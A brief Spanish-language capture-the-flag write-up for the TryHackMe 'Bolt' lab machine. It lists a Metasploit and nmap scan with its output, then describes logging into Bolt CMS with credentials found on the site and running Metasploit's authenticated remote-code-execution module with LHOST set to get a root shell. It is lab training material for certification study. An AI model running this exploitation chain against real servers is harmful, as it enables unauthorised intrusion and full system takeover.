# Maquina Bolt - TryHackme

* Nivel : Easy
* Máquina : Linux
* Útil para el Ejptv2
* Ip Maquina : 10.10.232.30 (En mi caso)

## Escaneo de puertos

Primero abro metasploit, creo un espacio de trabajo y ejecuto un nmap
```bash
service postgresql start
msfconsole -q
workspace -a poster
db_nmap -sV -A -O -p- -Pn -T4 10.10.232.30
```
```bash
Nmap: PORT     STATE SERVICE VERSION
[*] Nmap: 22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
[*] Nmap: 80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
[*] Nmap: 8000/tcp open  http    (PHP 7.2.32-1)
```

## Explotación

Abrir la web, leer y te dan la contraseña. La web usa bolt cmd, buscar el directorio del login para el bolt y poner las credenciales. Con esto miro la versión de bolt.

```bash
msf6 > search bolt
use exploit/unix/webapp/bolt_authenticated_rce
Y poner el user,contaseña,RHOSTS y LHOST.
```
shell 
/bin/bash -i

Y eres root.
